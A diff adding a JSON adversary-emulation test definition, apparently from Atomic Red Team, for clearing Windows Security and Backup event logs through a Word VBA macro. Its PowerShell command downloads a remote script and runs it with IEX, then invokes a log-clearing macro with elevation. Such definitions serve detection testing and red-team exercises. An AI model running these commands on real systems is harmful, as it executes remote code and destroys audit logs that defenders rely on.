@@ -1,0 +1,31 @@
+{
+    "name": "Clear Event Logs via VBA",
+    "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system.   Elevation is required for this module to execute properly, otherwise WINWORD will throw an Access Denied error ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1070.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Clear Windows Event Logs",
+    "source": "ART",
+    "uuid": "1b682d84-f075-4f93-9a89-8a8de19ffd6e",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Word must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
